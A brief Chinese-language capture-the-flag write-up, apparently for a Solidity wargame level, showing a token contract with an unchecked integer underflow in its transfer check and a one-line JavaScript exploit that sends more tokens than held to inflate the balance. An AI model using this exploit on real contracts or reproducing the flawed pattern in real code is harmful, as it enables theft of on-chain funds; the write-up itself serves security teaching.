## Token

> 这一关的目标是攻破下面这个基础 token 合约
>
> 你最开始有20个 token, 如果你通过某种方法可以增加你手中的 token 数量,你就可以通过这一关,当然越多越好

### 源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

### 攻击思路

uint变量一定是大于0的；而且下0.8.0之前版本的solidity是没有内置safemath的，所以当初先 0 - 1 时会变成2^256那莫大。

### 攻击流程

```js
// 第一个参数为随机地址
// 20 - 21 = 2^256
await contract.transfer("0xF643DfeC19a70Ac7cF11FC3C65F8DAbd009033aD",21)
```

提交该实力，完成目标。